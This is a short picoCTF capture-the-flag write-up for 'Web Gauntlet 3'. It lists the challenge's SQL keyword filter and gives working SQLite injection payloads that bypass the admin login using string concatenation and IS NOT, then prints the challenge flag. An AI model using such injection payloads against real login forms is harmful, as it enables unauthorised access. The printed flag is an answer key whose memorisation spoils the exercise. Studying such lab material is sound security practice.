# Web Gauntlet 3 ❓
Tags: Web Exploitation<br>
Point: 200<br>
AUTHOR: MADSTACKS<br>
Description:<br>
Last time, I promise! Only 25 characters this time. <br>
Log in as admin Site: http://mercury.picoctf.net:29772/  <br>
Filter: http://mercury.picoctf.net:29772/filter.php <br>

Hints:
- Each filter is separated by a space. Spaces are not filtered.
- There is only 1 round this time, when you beat it the flag will be in filter.php.
- sqlite


## Write-up: 📝
This challenge only have 1 round

## Solution: 💯

Filters: `or and true false union like = > < ; -- /* */ admin`

In the given hints, this chall don't filter **spaces**. We could use `IS NOT NULL` or `IS NOT` keywords to pass the **password** , but we need to close the string with must-have single quote so  our **password** is like (`'a' IS NOT 'b'`). The username is still the same with **concatenation operator** `ad'||'min`

User: `ad'||'min` 

Pass: `a' IS NOT 'b`

Then move to **filter.php** file to get the flag.

#### The Flag (for reference): ✔️
```
picoCTF{0n3_m0r3_t1m3_fc0f841ee8e0d3e1f479f1a01a617ebb}
```

